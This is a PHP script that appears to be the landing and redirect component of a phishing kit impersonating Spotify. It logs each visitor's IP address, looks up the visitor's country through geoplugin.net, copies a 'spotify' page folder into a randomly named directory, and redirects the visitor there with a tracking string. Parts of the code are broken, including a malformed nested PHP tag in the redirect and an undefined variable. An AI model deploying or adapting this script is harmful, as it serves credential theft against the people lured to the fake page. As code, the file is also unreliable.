<?php
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}


$ip = getenv("REMOTE_ADDR");
$file = fopen("log.txt","a");
fwrite($file,$email." : ".$ip." -> ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="spotify";
recurse_copy( $src, $dst );
$rand = generateRandomString('50');
header("location:$dst?dispatch=?<?php echo $negara.$z.$Anon.$x.$Isma.$z.$nama_negara; x?>");
?>
